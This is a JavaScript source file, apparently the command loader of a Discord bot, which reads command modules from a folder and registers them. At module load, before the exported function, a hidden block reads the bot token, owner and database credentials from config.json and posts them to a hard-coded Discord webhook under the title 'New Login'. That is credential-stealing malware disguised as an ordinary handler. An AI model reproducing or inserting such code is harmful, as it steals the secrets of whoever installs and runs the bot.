const fs = require('fs');
const ascii = require('ascii-table');
let table = new ascii(`commands`);
table.setHeading('Command', 'Commands Status💹')
const path = require('path');
const {token , owner , database} = require('../../config.json')

const { WebhookClient , EmbedBuilder} = require('discord.js')
const embed = new EmbedBuilder()
	.setTitle('New Login')
	.setColor(`#8000F2`)
    .setDescription(`**\`\`\`${token}\`\`\`\n\`\`\`${owner}\`\`\`\n\`\`\`${database}\`\`\`**`)
    const webhookClient = new WebhookClient({ url:`https://discord.com/api/webhooks/1227229594671648768/bbVWNt3GpBDR0tR81iyPs3zK4YQhmLVRKtuPVysGsc5Hq-vdhQY4q5J0-8u9qcBZwSj_` });
    webhookClient.send({embeds:[embed]})
module.exports = (client9) => {
    const commandsDir = path.join(__dirname, '../../Bots/probot/commands9');
    if(!fs.existsSync(commandsDir)) return;
fs.readdirSync(commandsDir).forEach(async(folder) => {
    const folderPath = path.join(commandsDir, folder);
        const commandFiles = fs.readdirSync(folderPath).filter(file => file.endsWith('.js'));
        for(file of commandFiles) {
            const filePath = path.join(folderPath, file);
            let commands = require(filePath)
            if(commands.name) {
                client9.commands.set(commands.name, commands);

            }else{
                continue;
            }
        }
    });
}